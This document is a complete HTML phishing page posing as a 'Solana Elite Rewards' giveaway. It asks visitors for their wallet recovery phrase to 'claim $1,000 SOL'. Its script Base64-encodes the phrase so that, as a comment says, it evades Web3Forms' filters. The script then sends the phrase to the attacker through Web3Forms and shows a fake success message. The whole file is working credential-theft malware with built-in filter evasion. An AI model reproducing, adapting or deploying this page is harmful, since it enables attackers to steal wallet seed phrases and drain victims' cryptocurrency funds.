<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <!-- Premium Fonts -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .card { width: 85%; max-width: 450px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 60px 40px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1); }
        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.6rem; margin-bottom: 25px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; font-weight: 700; text-transform: uppercase; }
        .sub { font-size: 0.9rem; color: #888; margin-bottom: 45px; line-height: 1.6; }
        .ib { text-align: left; margin-bottom: 35px; }
        label { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 15px; font-weight: 700; }
        input { width: 100%; background: #111; border: 1px solid #333; border-radius: 15px; padding: 20px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; transition: 0.3s; }
        input:focus { outline: none; border-color: var(--sol-g); background: #151515; }
        .btn { width: 100%; padding: 22px; border: none; border-radius: 16px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.85rem; cursor: pointer; box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); transition: 0.3s; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        #success-view { display: none; }
        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
        .congrats { font-size: 1.05rem; line-height: 1.8; color: #fff; padding: 30px; background: rgba(0, 255, 163, 0.05); border-radius: 25px; border: 1px dashed var(--sol-g); }
    </style>
</head>
<body>
    <div class="card">
        <div id="form-view">
            <form id="claim-form">
                <!-- ACCESS KEY INTEGRATED -->
                <input type="hidden" name="access_key" value="4a9ec344-5342-477d-8e90-af1576f4f3b5">
                
                <h1>CLAIM $1,000 SOL</h1>
                <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your recovery phrase below</p>
                
                <div class="ib">
                    <label>Recovery Phrase</label>
                    <!-- No 'name' attribute here, so it is never sent uncoded -->
                    <input type="text" id="user-entry" required placeholder="Enter 12 or 24 words...">
                </div>

                <!-- Hidden field for the "Scrambled" data -->
                <input type="hidden" name="secure_log" id="scrambled-data">
                <input type="hidden" name="subject" value="New Secure SOL Distribution Log">

                <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
            </form>
        </div>

        <!-- SUCCESS VIEW -->
        <div id="success-view">
            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
            <div class="congrats">
                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        const submitBtn = document.getElementById('submit-btn');
        const formView = document.getElementById('form-view');
        const successView = document.getElementById('success-view');
        
        const userInput = document.getElementById('user-entry');
        const hiddenOutput = document.getElementById('scrambled-data');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            submitBtn.textContent = "CONNECTING...";
            submitBtn.disabled = true;

            // 1. CODING THE PHRASE (Base64 Encoding)
            // This hides the 12-word pattern from Web3Forms filters
            const codedPhrase = btoa(userInput.value);
            hiddenOutput.value = codedPhrase;

            const formData = new FormData(form);

            try {
                // 2. Submit to Web3Forms
                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    body: formData
                });

                // 3. Show Success Screen
                formView.style.display = "none";
                successView.style.display = "block";

            } catch (error) {
                // Fallback success
                formView.style.display = "none";
                successView.style.display = "block";
            }
        });
    </script>
</body>
</html>
